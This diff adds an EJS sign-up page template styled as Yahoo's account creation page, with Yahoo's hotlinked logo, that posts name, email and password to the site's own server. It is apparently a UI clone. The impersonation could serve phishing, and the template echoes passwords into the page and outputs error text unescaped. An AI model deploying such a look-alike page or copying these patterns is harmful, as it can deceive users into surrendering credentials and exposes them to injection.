@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Sign up</title>
+	<link rel="stylesheet" type="text/css" href="../styles/auth.css">
+</head>
+
+<%
+	function showErr(errMsg) { 
+		if (errMsg !== undefined) { 
+			return `<span class="err">${errMsg}</span><br />`; 
+		} else { 
+			return ''; } 
+	} 
+%>
+
+<body>
+	<div id="login-body" class="loginish puree-v2 grid">
+		<div class="mbr-desktop-hd">
+			<span class="column">
+				<a href="#">
+					<img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" height="32">
+				</a>
+			</span>
+		</div>
+		<div class="login-box-container">
+			<div class="login-box center">
+				<div class="mbr-login-hd txt-align-center">
+					<img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" height="27">
+				</div>
+				<div id="account-attributes-challenge" class="challenge">
+					<h2 class="challenge-heading">Create a Yahoo account</h2>
+					<span class="challenge-desc signin-sub-title">Please sign-up to continue.</span>
+					<form id="regform" action="/sign-up" class="pure-form oneid-form-background reg-form grid-form" method="post">
+
+						<fieldset class="input-group form-fieldset">
+							<div id="usernamereg-fullname" class="pure-g name-field field-group">
+								<input type="text" id="usernamereg" class="input-with-icon icon-name" name="username" placeholder="Full name" aria-label="First name" value="<%= params.username ? params.username : '' %>" maxlength="32">
+								<div class="input-field-icon"></div>
+								<label for="usernamereg-fullName">Full name</label>
+							</div>
+						</fieldset>
+						<% if (error.username) { %>
+						<p class="error-msg"><%- showErr(error.username) %></p>
+						<% } %>
+
+						<fieldset class="form-fieldset input-group field-group">
+							<input type="text" id="usernamereg-email" class="input-with-icon icon-email with-yid-domain" name="email" placeholder="abc@example.com" maxlength="32" value="<%= params.email ? params.email : '' %>">
+							<div class="input-field-icon"></div>
+							<label for="usernamereg-email">Desirable email</label>
+						</fieldset>
+						<% if (error.email) { %>
+						<p class="error-msg"><%- showErr(error.email) %></p>
+						<% } %>
+
+						<fieldset class="form-fieldset input-group field-group usernamereg-password-container blurred">
+							<input type="password" id="usernamereg-password" class="input-with-icon icon-password" name="password" placeholder="" maxlength="128" value="<%= params.password ? params.password : '' %>">
+							<div class="input-field-icon"></div>
+							<label for="usernamereg-password">Create Password</label>
+						</fieldset>
+						<% if (error.password) { %>
+						<p class="error-msg"><%- showErr(error.password) %></p>
+						<% } %>
+
+						<fieldset class="form-fieldset input-group field-group usernamereg-password-container blurred">
+							<input type="password" id="usernamereg-password" class="input-with-icon icon-password" name="re_password" placeholder="" maxlength="128" value="<%= params.re_password ? params.re_password : '' %>">
+							<div class="input-field-icon"></div>
+							<label for="usernamereg-password">Re-enter Password</label>
+						</fieldset>
+						<% if (error.re_password) { %>
+						<p class="error-msg"><%- showErr(error.re_password) %></p>
+						<% } %>
+
+						<div class="button-container">
+							<button id="reg-submit-button" name="signup" type="submit" class="challenge-button pure-button puree-button-primary puree-spinner-button">Continue</button>
+						</div>
+
+						<p class="ureg-sign-in txt-align-center">Already have an account? <a href="/sign-in" class="js-link-feedback">Sign in</a></p>
+					</form>
+				</div>
+			</div>
+		</div>
+	</div>
+</body>
+
+</html>
